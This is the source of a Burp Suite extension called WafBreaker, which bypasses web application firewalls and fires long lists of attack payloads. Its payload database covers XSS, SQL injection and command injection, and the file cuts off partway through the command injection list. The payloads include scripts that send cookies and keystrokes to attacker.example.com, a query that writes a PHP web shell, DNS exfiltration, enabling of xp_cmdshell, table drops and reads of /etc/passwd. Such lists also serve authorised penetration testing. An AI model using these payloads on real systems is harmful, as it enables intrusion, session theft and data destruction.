# -*- coding: utf-8 -*-
"""
██╗    ██╗ █████╗ ███████╗██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗
██║    ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║███████║█████╗  ██████╔╝██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝
██║███╗██║██╔══██║██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║  ██║██║     ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

  Burp Suite WAF Bypass Extension  |  v1.0
  Select parameter value → Right-click → WafBreaker → [Vuln Type]

  Phase 1  →  Initial probe (detects WAF)
  Phase 2  →  Pre-bypass techniques (headers, charset, method, body-size, overrides)
  Phase 3  →  Full payload barrage using the working bypass technique

  Bypass techniques from article:
    · HTTP Header Trust  (X-Forwarded-For, X-Originating-IP, X-Remote-IP ...)
    · Charset manipulation  (ibm037 / EBCDIC)
    · HTTP Method override  (custom verbs, X-HTTP-Method-Override)
    · Large body padding  (>128 KB — exceeds WAF inspection limit)
    · Encoding obfuscation  (case, null-byte, double-tag, unicode, entities ...)
"""

from burp import IBurpExtender, IContextMenuFactory
from javax.swing import JMenuItem, JMenu
from java.util import ArrayList
from java.lang import Runnable
from java.lang import Thread as JThread
import re
import time

EXT_NAME  = "WafBreaker"
VERSION   = "1.0"

# ═══════════════════════════════════════════════════════════════════════════════
#   PAYLOAD DATABASE
# ═══════════════════════════════════════════════════════════════════════════════

INITIAL_PROBES = {
    "XSS":               "<script>alert(1)</script>",
    "SQL Injection":     "' OR 1=1--",
    "Command Injection": "; id",
    "LFI":               "../../../etc/passwd",
    "SSRF":              "http://127.0.0.1/",
}

PAYLOADS = {
    "XSS": [
        # ── Basic script tags ─────────────────────────────────────────────────
        "<script>alert(1)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>console.log(document.domain)</script>",
        # ── Case toggling ─────────────────────────────────────────────────────
        "<sCrIpT>alert(1)</sCriPt>",
        "<SCRIPT>ALERT(1)</SCRIPT>",
        "<ScRiPt>AlErT(1)</ScRiPt>",
        # ── Null byte ─────────────────────────────────────────────────────────
        "<scri%00pt>alert(1)</scri%00pt>",
        "<scri\x00pt>alert(1)</scri\x00pt>",
        # ── Double / nested tag ───────────────────────────────────────────────
        "<scri<script>pt>alert(1)</scr</script>ipt>",
        "<sc<script>ript>alert(1)</sc</script>ript>",
        "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
        # ── Unicode inside script ─────────────────────────────────────────────
        "<script>\\u0061lert('22')</script>",
        "<script>eval('\\x61lert(1)')</script>",
        "<script>eval(8680439..toString(30))(983801..toString(36))</script>",
        "<script>String.fromCharCode(97,108,101,114,116)(1)</script>",
        # ── img onerror ───────────────────────────────────────────────────────
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS');>",
        "<img src=x onerror=alert('XSS')//",
        "<img/src=1/onerror=alert(1)>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
        "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
        "<img src=1 onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
        "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
        "\"><img src=x onerror=alert('XSS');>",
        "<><img src=1 onerror=alert(1)>",
        # ── SVG ───────────────────────────────────────────────────────────────
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg onload=alert(1)//",
        "<svg><script>alert(1)</script></svg>",
        "<svg><script>alert&lpar;1&rpar;",
        "<svg id=alert(1) onload=eval(id)>",
        "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
        "\"><svg/onload=alert(/XSS/)>",
        "<svgonload=alert(1)>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
        "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
        "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
        "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
        "<svg><animatetransform onbegin=\"alert(1)\"></animatetransform></svg>",
        "<svg><script href=data:,alert(1) />",
        # ── Autofocus / focus events ──────────────────────────────────────────
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        # ── body / load events ────────────────────────────────────────────────
        "<body onload=alert(1)>",
        "<body/onload=alert(1)>",
        "<body onload=alert(/XSS/.source)>",
        "<body ontouchstart=alert(1)>",
        "<body ontouchend=alert(1)>",
        "<body ontouchmove=alert(1)>",
        # ── Pointer events ────────────────────────────────────────────────────
        "<div onpointerover=\"alert(1)\">HOVER</div>",
        "<div onpointerdown=\"alert(1)\">CLICK</div>",
        "<div onpointerenter=\"alert(1)\">ENTER</div>",
        "<div onpointermove=\"alert(1)\">MOVE</div>",
        "<div onpointerout=\"alert(1)\">OUT</div>",
        "<div onpointerup=\"alert(1)\">UP</div>",
        # ── Media elements ────────────────────────────────────────────────────
        "<video/poster/onerror=alert(1)>",
        "<video><source onerror=\"javascript:alert(1)\">",
        "<video src=_ onloadstart=\"alert(1)\">",
        "<video src=1 onerror=alert(1)>",
        "<audio src onloadstart=alert(1)>",
        "<audio src=1 onerror=alert(1)>",
        # ── HTML5 misc ────────────────────────────────────────────────────────
        "<details open ontoggle=alert(1)>",
        "<details/open/ontoggle=\"alert`1`\">",
        "<marquee onstart=alert(1)>",
        "<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>",
        "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
        "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\" style=\"content-visibility:auto\">",
        # ── Objects / embeds ──────────────────────────────────────────────────
        "<object data=javascript:alert(1)>",
        "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;1&#x29;\">",
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">",
        "<form action=javascript:alert(1)><input type=submit>",
        "<button onclick=alert(1)>XSS</button>",
        # ── javascript: protocol variants ─────────────────────────────────────
        "javascript:alert(1)",
        "javascript:prompt(1)",
        "javascript:confirm(document.domain)",
        "javascript://%0Aalert(1)",
        "javascript://anything%0D%0A%0D%0Awindow.alert(1)",
        "java%0ascript:alert(1)",
        "java%09script:alert(1)",
        "java%0dscript:alert(1)",
        "\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)",
        "\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)",
        "\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)",
        # ── MathML ────────────────────────────────────────────────────────────
        "<math href=\"javascript:alert(1)\">CLICK</math>",
        # ── HTML entity encoding ──────────────────────────────────────────────
        "&#34;&#62;&#60;img src=x onerror=confirm&#40;1&#41;&#62;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41",
        "%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341",
        # ── CSS injection ─────────────────────────────────────────────────────
        "<STYLE>.x{background-image:url(\"javascript:alert(1)\")}</STYLE>",
        "background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(1)>\");",
        # ── Extra attribute confusion ──────────────────────────────────────────
        "<a aa aaa aaaa href=javascript:alert(1)>xss</a>",
        # ── URL / percent encoding ────────────────────────────────────────────
        "<a src=\"%3Aconfirm(1)\">",
        "<a href=\"javascript%3Aalert(1)\">click</a>",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        # ── Line break injection in protocol ──────────────────────────────────
        "<a src=\"%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)\">",
        # ── Unicode / backslash in handler ────────────────────────────────────
        "<marquee onstart=\\u0070r\\u006fmpt(1)>",
        "<img src=x onerror=\\u0061lert(1)>",
        # ── data URI ──────────────────────────────────────────────────────────
        "data:text/html,<script>alert(0)</script>",
        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+",
        "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
        # ── VBScript (IE legacy) ──────────────────────────────────────────────
        "vbscript:msgbox(\"XSS\")",
        # ── noscript bypass ───────────────────────────────────────────────────
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        # ── Context escapes ───────────────────────────────────────────────────
        "'-alert(1)-'",
        "\"><script>alert(1)</script>",
        "';alert(1)//",
        "</script><script>alert(1)</script>",
        "\"onmouseover=\"alert(1)",
        "#\"><img src=/ onerror=alert(2)>",
        "-(confirm)(document.domain)//",
        "; alert(1);//",
        # ── Fetch / exfil (OOB) ───────────────────────────────────────────────
        "<script>fetch('https://attacker.example.com',{method:'POST',mode:'no-cors',body:document.cookie});</script>",
        "<svg/onload='fetch(\"//attacker.example.com/\"+document.cookie)'>",
        "<script>new Image().src=\"http://attacker.example.com/?c=\"+document.cookie;</script>",
        "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://attacker.example.com/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
        # ── CDATA / namespace tricks ──────────────────────────────────────────
        "<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
        # ── Markdown (for markdown renderers) ────────────────────────────────
        "[a](javascript:prompt(document.cookie))",
        "[a](j a v a s c r i p t:prompt(document.cookie))",
        "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
        "[a](javascript:window.onerror=alert;throw%201)",
        # ── DOM-based ─────────────────────────────────────────────────────────
        "<script>debugger;</script>",
        "<script>alert(document.domain.concat('\\n').concat(window.origin))</script>",
        # ── Template engine injections ────────────────────────────────────────
        "${alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
        "#{7*7}",
        "*{color:red}",
        # ── AngularJS sandbox escapes ─────────────────────────────────────────
        "{{$on.constructor('alert(1)')()}}",
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
        "1&ng-app&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
        # ── Event handler misc ────────────────────────────────────────────────
        "<select onchange=alert(1)><option>1</option><option>2</option></select>",
        "<form><button formaction=javascript:alert(1)>CLICK</button></form>",
        "<isindex action=javascript:alert(1) type=image>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">",
        # ── Awesome-WAF: specific WAF bypasses ────────────────────────────────
        # Cloudflare
        "<svg onx=() onload=(confirm)(1)>",
        "<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>",
        "<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f>",
        "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\\u0061\\u006C\\u0065\\u0072\\u0074&lpar;1&rpar;\">X</a>",
        "javascript:{alert`0`}",
        "<j id=x style=\"-webkit-user-modify:read-write\" onfocus={window.onerror=eval}throw/0/+name>H</j>#x",
        # Barracuda
        "<body style=\"height:1000px\" onwheel=\"alert(1)\">",
        "<div contextmenu=\"xss\">Right-Click<menu id=\"xss\" onshow=\"alert(1)\">",
        "<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere",
        # Cloudbric / F5
        "<a69/onclick=[1].findIndex(alert)>pew",
        "<table background=\"javascript:alert(1)\"></table>",
        "\"/><marquee onfinish=confirm(123)>a</marquee>",
        # Comodo
        "<input/oninput='new Function`confir\\u006d\\`0\\``'>",
        "<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme",
        # DotDefender
        "<img src=\"WTF\" onError=\"{var {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2Bh%2Bn)(/0wn3d/.source)\" />",
        # HTML5 popover (modern)
        "<strong><button popovertarget=x>click</button><test onbeforetoggle=alert(document.domain) popover id=x>x</test></strong>",
        # ModSecurity
        "<a href=\"jav%0Dascript&colon;alert(1)\">",
        # CRLF iframe
        "<iframe src=\"%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)\">",
        # Dynamic concatenation
        "<script>eval('al'+'er'+'t()')</script>",
        "<script>+-+-1-+-+alert(1)</script>",
        # Junk attribute flood
        "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe",
        # Comment in script
        "<!--><script>alert/**/()/**/</script>",
        # Tab separating javascript: keyword
        "<iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>",
        # AWS WAF
        "<script>eval(atob(decodeURIComponent('YWxlcnQoMSk=')))</script>",
    ],

    "SQL Injection": [
        # ── Auth bypass ───────────────────────────────────────────────────────
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR '1'='1'--",
        "' or 1=1 limit 1 --",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "1 OR 1=1",
        "1' OR '1'='1",
        "or 1-- -",
        "' or 1 or '1",
        "\"or 1 or\"",
        "admin'--",
        "admin' #",
        "admin'/*",
        "admin' OR '1'='1",
        "' OR 'x'='x",
        "admin' AND 1=0 UNION ALL SELECT 'admin','161ebd7d45089b3446ee4e0d86dbcf92'--",
        # ── UNION column count enumeration ────────────────────────────────────
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION ALL SELECT 1,2,3--",
        # ── UNION data extraction ─────────────────────────────────────────────
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT table_name,2 FROM information_schema.tables--",
        "' UNION SELECT column_name,2 FROM information_schema.columns--",
        "' UNION SELECT @@version,2--",
        "' UNION SELECT user(),2--",
        "' UNION SELECT database(),2--",
        "' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--",
        # ── WAF bypass: comment injection (article + OWASP) ───────────────────
        "' un/**/ion sel/**/ect 1,2,3--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
        "' UNION%20SELECT%201,2,3--",
        "' UNION%09SELECT%091,2,3--",
        "'+UNION+SELECT+1,2,3--",
        "1/*comment*/AND/**/1=1/**/--",
        "1/*!12345UNION*//*!12345SELECT*/1--",
        "/**//*!50000%55nIOn*//**//*!50000%53eLECt*//**/1,2,3--",
        "/_!%55NiOn_/ /_!%53eLEct_/ 1,2,3--",
        "+#uNiOn+#sEleCt+1,2,3--",
        "/_!u%6eion_/ /_!se%6cect_/ 1,2,3--",
        # ── WAF bypass: no-space alternatives ─────────────────────────────────
        "1%09AND%091=1%09--",
        "1%0AAND%0A1=1%0A--",
        "1%0BAND%0B1=1%0B--",
        "1%0CAND%0C1=1%0C--",
        "1%0DAND%0D1=1%0D--",
        "1%A0AND%A01=1%A0--",
        "(1)AND(1)=(1)--",
        "1%09union%09select%091,2,3--",
        "uni%0bon+se%0blect+1,2,3--",
        # ── WAF bypass: case variation ────────────────────────────────────────
        "1+UnIoN/**/SeLecT/**/1,2,3--",
        "1+UNunionION+SEselectLECT+1,2,3--",
        "%55nion(%53elect)1,2,3--",
        "union%20distinct%20select%201,2,3--",
        "u%6eion se%6cect 1,2,3--",
        "unio%6e se%6cect 1,2,3--",
        # ── WAF bypass: HTTP parameter pollution ──────────────────────────────
        "1;select+1&id=2,3+from+users+where+id=1--",
        "1+union/_&b=_/select+1,2,3--",
        # ── WAF bypass: hex / concat tricks ──────────────────────────────────
        "concat(0x223e,@@version)",
        "concat(0x273e27,version(),0x3c212d2d)",
        "(1)union(select(1),hex(hash)from(users))",
        "(1)union(((((((select(1),hex(hash)from(users))))))))",
        # ── ORDER BY enumeration ──────────────────────────────────────────────
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' ORDER BY 4--",
        "1' ORDER BY 5--",
        # ── Boolean blind ─────────────────────────────────────────────────────
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1--",
        "1' RLIKE '1",
        "1' OR '1' LIKE '1",
        "1) OR (1=1",
        "1)) OR ((1=1",
        "/?id=1+OR+0x50=0x50",
        "1 AND LENGTH(@@hostname)=1--",
        "1 AND ASCII(SUBSTRING(@@hostname,1,1))>64--",
        "SUBSTRING(VERSION(),1,1)LIKE(5)",
        "SUBSTRING(VERSION(),1,1)NOT IN(4,3)",
        "SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4",
        # ── Error-based: MySQL EXTRACTVALUE ───────────────────────────────────
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
        # ── Error-based: MySQL UPDATEXML ──────────────────────────────────────
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
        # ── Error-based: MySQL EXP ────────────────────────────────────────────
        "' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        # ── Error-based: MySQL FLOOR/RAND ─────────────────────────────────────
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        # ── Error-based: MySQL GTID_SUBSET ────────────────────────────────────
        "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        # ── Error-based: PostgreSQL CAST ──────────────────────────────────────
        "' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS NUMERIC)--",
        # ── Error-based: MSSQL CONVERT ────────────────────────────────────────
        "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND 1=CONVERT(INT,@@version)--",
        # ── Error-based: Oracle XMLType ───────────────────────────────────────
        "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
        # ── Time-based: MySQL SLEEP ───────────────────────────────────────────
        "' AND SLEEP(5)--",
        "' AND SLEEP(5)#",
        "' OR SLEEP(5)#",
        "' AND '1'='1' AND SLEEP(5)",
        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(SUBSTRING(VERSION(),1,1)=5,SLEEP(5),0)--",
        "1 AND ELT(1=1,SLEEP(5))--",
        "RLIKE SLEEP(5)",
        # ── Time-based: MySQL BENCHMARK ───────────────────────────────────────
        "' AND BENCHMARK(5000000,MD5('test'))--",
        "' OR BENCHMARK(5000000,SHA1('test'))--",
        "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
        # ── Time-based: PostgreSQL ────────────────────────────────────────────
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT 1 FROM PG_SLEEP(5))--",
        "' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",
        # ── Time-based: MSSQL ─────────────────────────────────────────────────
        "1; WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'",
        "';waitfor delay '0:0:5'--",
        # ── Time-based: Oracle ────────────────────────────────────────────────
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        "' OR DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        # ── Time-based: SQLite heavy query ────────────────────────────────────
        "1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
        # ── Stacked queries ───────────────────────────────────────────────────
        "'; SELECT * FROM users--",
        "1'; DROP TABLE users--",
        "1; EXEC xp_cmdshell('whoami')--",
        "1; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
        # ── Null byte ─────────────────────────────────────────────────────────
        "' OR 1=1%00",
        "' OR 1=1\x00",
        # ── Double URL encoding ───────────────────────────────────────────────
        "%2527 OR 1=1--",
        "%27 OR 1=1--",
        # ── MySQL file operations ──────────────────────────────────────────────
        "' UNION SELECT LOAD_FILE('/etc/passwd'),2--",
        "' INTO OUTFILE '/var/www/html/sh.php' LINES TERMINATED BY '<?php system($_GET[c]); ?>'--",
        # ── OOB DNS exfil ──────────────────────────────────────────────────────
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.example.com\\\\a'))--",
        # ── Realistic value-prefixed variants (boolean-string) ─────────────────
        # These mimic actual user input in a string column: user' AND cond--
        "test' AND 1=1--",
        "test' AND 1=2--",
        "test' OR 1=1--",
        "test' OR 1=2--",
        "admin' OR '1'='1",
        "admin' OR '1'='2",
        "test' AND 'a'='a",
        "test' AND 'a'='b",
        "a' OR 'x'='x",
        "a' OR 'x'='y",
        "(test)' OR 1=1--",
        "(test)' AND 1=1--",
        "x' OR 1=1 OR 'x'='y",
        "foo' OR 1=1 LIMIT 1--",
        "bar' OR 1=1 LIMIT 1 OFFSET 0--",
        "test') OR ('1'='1",
        "test')) OR (('1'='1",
        "1' AND '1'='1' AND SLEEP(0)--",
        # ── Realistic value-prefixed variants (boolean-numeric) ────────────────
        "1 AND 1=1--",
        "1 AND 1=2--",
        "0 OR 1=1--",
        "2 OR 1=1--",
        "1 AND TRUE--",
        "1 AND FALSE--",
        "1) AND (1=1",
        "1)) OR ((1=1",
        "1 AND 1=1 LIMIT 1--",
        "1 OR 2>1--",
        "-1 OR 2>1--",
        "0 UNION SELECT NULL--",
        # ── Realistic value-prefixed variants (error-based) ────────────────────
        "test' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "test' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "test' AND EXP(~(SELECT * FROM (SELECT version())x))--",
        "test' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "test' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata),0x7e))--",
        "test' AND 1=CAST((SELECT version()) AS NUMERIC)--",
        "test' AND 1=CONVERT(INT,@@version)--",
        "test' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM DUAL)--",
        # ── Realistic value-prefixed variants (time-based) ────────────────────
        "test' AND SLEEP(5)--",
        "test' OR SLEEP(5)--",
        "test' AND SLEEP(5) AND 'x'='x",
        "1 AND IF(1=1,SLEEP(5),0)--",
        "1 AND IF(ASCII(SUBSTRING(database(),1,1))>90,SLEEP(5),0)--",
        "test' AND BENCHMARK(5000000,MD5('test'))--",
        "test'; WAITFOR DELAY '0:0:5'--",
        "test' AND (SELECT 1 FROM PG_SLEEP(5))=1--",
        "test' AND DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)=1--",
        # ── Realistic value-prefixed variants (union-based) ────────────────────
        "test' UNION SELECT NULL--",
        "test' UNION SELECT NULL,NULL--",
        "test' UNION SELECT NULL,NULL,NULL--",
        "-1' UNION SELECT 1,2,3--",
        "-1' UNION ALL SELECT NULL,NULL,NULL--",
        "test' UNION SELECT @@version,NULL--",
        "test' UNION SELECT user(),database()--",
        "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
        "test' UNION SELECT 1,CONCAT(0x7e,@@version,0x7e),3--",
        "0' UNION SELECT username,password,3 FROM users--",
        # ── Realistic value-prefixed variants (stacked) ────────────────────────
        "test'; SELECT 1--",
        "test'; INSERT INTO users VALUES(1,'hacked','hacked')--",
        "test'; DROP TABLE users--",
        "1; EXEC xp_cmdshell('whoami')--",
        "test'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
    ],

    "Command Injection": [
        # ── Unix semicolons ───────────────────────────────────────────────────
        "; id",
        "; id #",
        "; id //",
        "; whoami",
        "; cat /etc/passwd",
        "; uname -a",
        "; ls -la /",
        "; ls -la /etc/",
        "; env",
        "; printenv",
        "; hostname",
        "; ifconfig",
        "; ip a",
        # ── Unix pipes ────────────────────────────────────────────────────────
        "| id",
        "|| id",
        "| whoami",
        "| cat /etc/passwd",
        "| uname -a",
        "|id",
        "||id",
        "|whoami",
        # ── Ampersand ─────────────────────────────────────────────────────────
        "& id",
        "&& id",
        "& whoami",
        "&id",
        "&&id",
        # ── Newline / CRLF injection ──────────────────────────────────────────
        "\n id",
        "\r\n id",
        "%0aid",
        "%0a id",
        "%0a%0d id",
        "%0did",
        # ── Subshell / backtick ───────────────────────────────────────────────
        "`id`",
        "$(id)",
        "`whoami`",
        "$(whoami)",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "`uname -a`",
        "$(uname${IFS}-a)",
        # ── IFS bypass (WAF space evasion, from commix patterns) ─────────────
        "${IFS}id",
        ";${IFS}id",
        "|${IFS}id",
        "${IFS}cat${IFS}/etc/passwd",
        "$IFS$9id",
        "$IFS$9cat$IFS$9/etc/passwd",
        "{id}",
        "id",
        # ── Brace expansion ───────────────────────────────────────────────────
        "{ls,-la}",
        "{cat,/etc/passwd}",
        "{id}",
        # ── Argument splitting bypass ─────────────────────────────────────────
        "ca$@t /etc/passwd",
        "c'a't /etc/passwd",
        "c\"a\"t /etc/passwd",
        "/bin/c'at' /etc/passwd",
        "/???/??t /etc/passwd",
        "/???/c?t /etc/passwd",
        # ── Glob / wildcard bypass ────────────────────────────────────────────
        "/bin/cat /etc/pass*",
        "/bin/cat /etc/p?sswd",
        "l''s",
        # ── Python / interpreter injection ────────────────────────────────────
        "; python -c \"import os; os.system('id')\"",
        "; python3 -c \"import os; os.system('id')\"",
        "; perl -e 'system(\"id\")'",
        "; ruby -e 'exec(\"id\")'",
        "; php -r 'system(\"id\");'",
        "; node -e 'require(\"child_process\").exec(\"id\",function(e,s,r){process.stdout.write(s)})'",
        # ── Base64 encoded command bypass ─────────────────────────────────────
        "; echo aWQ= | base64 -d | bash",
        "; bash -c \"{echo,aWQ=}|{base64,-d}|bash\"",
        "; echo d2hvYW1p | base64 -d | sh",
        "$(echo aWQ= | base64 -d)",
        # ── Hex encoded ───────────────────────────────────────────────────────
        "; $(printf '\\x69\\x64')",
        "; $(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
        # ── Encoded separators ────────────────────────────────────────────────
        "1%3Bid",
        "1%0Aid",
        "1%0A%0Did",
        "1%26id",
        "1%7Cid",
        "1%7C%7Cid",
        # ── Context escapes ───────────────────────────────────────────────────
        "\"; id #",
        "'; id #",
        "\"; whoami #",
        "'; whoami #",
        "1`id`",
        "1$(id)",
        "a;id;a",
        "a|id|a",
        "a;a;id",
        "a|a|id",
        # ── Windows specifics ─────────────────────────────────────────────────
        "& whoami",
        "| whoami",
        "&& whoami",
        "& dir",
        "| dir",
        "& ipconfig",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "& net user",
        "& net localgroup administrators",
        "& systeminfo",
        "& wmic os get caption",
        "| dir C:\\",
        # ── Windows PowerShell ────────────────────────────────────────────────
        "& powershell -c whoami",
        "& powershell -c Get-Process",
        "| powershell -nop -c whoami",
        # ── Network callback ──────────────────────────────────────────────────
        "; ping -c 3 127.0.0.1",
        "; ping -n 3 127.0.0.1",
        "; curl http://127.0.0.1:1337/",
        "; curl http://127.0.0.1:1337/$(id)",
